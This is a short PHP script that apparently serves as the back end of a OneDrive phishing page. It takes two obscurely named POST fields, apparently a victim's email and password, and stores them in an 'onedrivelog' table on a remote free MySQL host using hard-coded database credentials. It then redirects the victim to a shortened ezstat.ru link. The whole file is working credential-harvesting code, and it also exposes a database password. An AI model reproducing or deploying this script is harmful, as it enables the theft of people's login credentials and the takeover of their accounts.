<?php
$server = "sql3.freemysqlhosting.net";
$user = "sql3404323";
$pass = "6wzN2j9b3a";
$dbname = "sql3404323";
 
//Creating connection for mysqli
 
$conn = new mysqli($server, $user, $pass, $dbname);
 
//Checking connection
 
if($conn->connect_error){
 die("Connection failed:" . $conn->connect_error);
}

$jade = mysqli_real_escape_string($conn, $_POST['jade']);
$crakass = mysqli_real_escape_string($conn, $_POST['crakass']);
 
$sql = "INSERT INTO onedrivelog (jade,crakass) VALUES ('$jade','$crakass')";
 
if($conn->query($sql) === TRUE){
 header("Location: https://ezstat.ru/2k5Yh5");
}
else
{
 echo "Error" . $sql . "<br/>" . $conn->error;
}
$conn->close();
?>